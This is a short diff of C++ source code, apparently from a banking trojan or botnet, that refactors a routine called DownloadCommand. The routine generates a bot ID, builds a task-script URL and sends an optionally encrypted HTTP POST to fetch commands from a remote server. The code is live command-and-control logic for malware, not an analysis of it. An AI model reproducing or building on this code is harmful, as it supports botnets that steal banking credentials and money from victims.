@@ -359,11 +359,13 @@ void StopTaskManager(PTaskManager Manager)
 }
 //----------------------------------------------------------------------------
 
-bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
+bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 {
 	// Загрузить команду/ набор команд
+	bool GenerateURL = STR::IsEmpty(URL);
 
-	string URL = (!STR::IsEmpty(aURL)) ? string(aURL) : GetBankingScriptURL(SCRIPT_TASK, true);
+	if (GenerateURL)
+		URL = GetBotScriptURL(SCRIPT_TASK);
 
 	string BotID = GenerateBotID2(GetPrefix(true));
 
@@ -377,7 +379,7 @@ bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
 
 	#ifdef CryptHTTPH
 		PCHAR Password = GetMainPassword();
-		bool Result = CryptHTTP::Post(URL.t_str(), Password, Fields, HTMLCode, &Response);
+		bool Result = CryptHTTP::Post(URL, Password, Fields, HTMLCode, &Response);
         STR::Free(Password);
 	#else
     	bool Result = HTTP::Post(URL, Fields, HTMLCode, &Response);
@@ -402,6 +404,10 @@ bool DownloadCommand(PCHAR aURL, PCHAR *HTMLCode)
 
     HTTPResponse::Clear(&Response);
 	Strings::Free(Fields);
+
+
+	if (GenerateURL)
+		STR::Free(URL);
 
     return Result;
 }
